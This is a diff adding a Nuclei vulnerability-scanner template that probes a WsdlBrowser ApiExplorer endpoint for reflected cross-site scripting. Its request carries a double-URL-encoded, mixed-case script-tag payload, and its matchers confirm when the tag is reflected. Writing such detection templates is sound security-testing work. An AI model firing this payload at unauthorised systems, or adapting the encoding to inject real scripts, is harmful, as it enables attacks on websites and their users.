@@ -1,0 +1,39 @@
+id: kaue-xss-Wsdl
+
+info:
+  name: kauexsserror-WSDL
+  author: kauenavarro
+  severity: medium
+  description: Procura por respostas refletidas.
+  tags: xss
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WsdlBrowser/ApiExplorer/RestSchema?ns=%2568%2574%2574%2570%253A%252F%252F%2577%2577%2577%252E%2572%2565%2575%2574%2565%2572%2573%252E%2563%256F%256D%252F%256E%2573%252F%2532%2530%2531%2536%252F%2530%2534%252F%2531%2539%252F%2577%2565%2562%2573%2565%2572%2576%2569%2563%2565%2573%252F%2572%256B%2564%252F%2541%2575%2574%256F%2549%2564%2541%2564%256D%2569%256E%255F%2531%253C%2553%2563%2552%2569%2550%2574%2520%253Ealert%2528document.domain%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E&op=SetAlertSub_1&protocol=JSON&svc=Alerting_1"
+    
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<ScRiPt >alert(document.domain)</sCripT>"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: word
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
+        part: body
+        condition: and
+        negative: true
+
+      - type: status
+        status:
+          - 200
